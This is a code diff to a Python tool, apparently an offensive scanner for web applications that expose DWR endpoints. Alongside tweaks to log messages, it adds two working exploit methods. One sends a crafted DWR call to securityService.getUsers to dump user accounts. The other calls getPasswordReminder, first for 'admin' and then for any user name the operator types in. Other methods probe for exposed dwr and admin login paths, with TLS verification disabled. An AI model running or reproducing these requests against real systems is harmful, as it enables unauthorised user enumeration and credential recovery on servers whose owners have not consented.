@@ -76,18 +76,18 @@ class Cofe:
 
     """ this method is used for search dwr path.. """
     def HaveDWR(self):
-        print(info("[+] Finding DWR path.."))
+        print(info("[+] Finding DWR path \n"))
         r = requests.get(self.url+"dwr/", headers={"User-Agent":self.agent}, verify=False)
         if "200" in str(r) and not "404" in r.text:
-            print(vulnerable("[+] Critical! Find DWR PATH ==> {}".format(self.url+"dwr")))
+            print(vulnerable(" [+] Critical! Find DWR PATH: {}".format(self.url+"dwr")))
 
     
 
     def HaveDWRView(self):
-        print(info(("[+] Finding Other dwr path..")))
+        print(info(("[+] Finding Other dwr path")))
         r = requests.get(self.url+"dwr-view/", headers={"User-Agent":self.agent}, verify=False)
         if '200' in str(r) and not '404' in r.text:
-            print(vulnerable("[+] Critical! FIND DWR-VIEW PATH ==> {}").format(self.url+"dwr-view"))
+            print(vulnerable(" [+] Critical! FIND DWR-VIEW PATH: {}").format(self.url+"dwr-view"))
 
 
 
@@ -109,8 +109,37 @@ class Cofe:
     def GetAdminLogin(self):
         r = requests.get(self.url+"admin/admin.login.action", headers={"User-Agent":self.agent}, verify=False)
         if "200" in str(r) and not "404" in r.text:
-            print(critical(" [+] ADMIN path found ==> \n{}".format(self.url+"admin/admin.login.action")))
+            print(critical("[+] ADMIN path found: {} \n".format(self.url+"admin/admin.login.action")))
 
-    
+
+
+
+
+    def XptGetUsers(self):
+        exploit = {"callCount":1,"page":"/dwr-view/test/userService","httpSessionId":"","scriptSessionId":'15467B75AB0FF3158D39ADF6D866C078381',
+        "c0-scriptName":"securityService","c0-methodName":"getUsers", "c0-id":0, "c0-param0":"number:0", "c0-param1":"boolean:false", "batchId":2}
+        r = requests.post(self.url + "dwr/call/plaincall/securityService.getUsers.dwr", data=exploit, verify=False)
+        if "200" in str(r) and not "404" in r.text:
+            print(r.text)
             
-        
+
+
+
+
+    def XptGetURemainder(self):
+        exploit = {"callCount":1,"page":"/dwr-view/test/securityService","httpSessionId":"CDB3084D13EEC28BED7EAC3CE49F902C","scriptSessionId":"5EE540BF8C30DE30ACD6E0045EC3D44C464",
+        "c0-scriptName":"securityService","c0-methodName":"getPasswordReminder","c0-id":"0","c0-param0":"string:admin","batchId":'2'}
+        r = requests.post(self.url + "dwr-view/call/plaincall/securityService.getPasswordReminder.dwr", data=exploit, verify=False)
+        if "200" in str(r) and not "404" in r.text:
+            remainderUser = input("[+] Type the user to get ther password Remainder:  ").lower()
+            xpltUser = {"callCount":1,"page":"/dwr-view/test/securityService","httpSessionId":"CDB3084D13EEC28BED7EAC3CE49F902C","scriptSessionId":"5EE540BF8C30DE30ACD6E0045EC3D44C464",
+            "c0-scriptName":"securityService","c0-methodName":"getPasswordReminder","c0-id":"0","c0-param0":"string:"+remainderUser,"batchId":'2'}
+            r2 = requests.post(self.url + "dwr-view/call/plaincall/securityService.getPasswordReminder.dwr", data=xpltUser, verify=False)
+            if "200" in str(2) and not "404" in r.text:
+                print(r2.text)
+
+
+
+
+
+
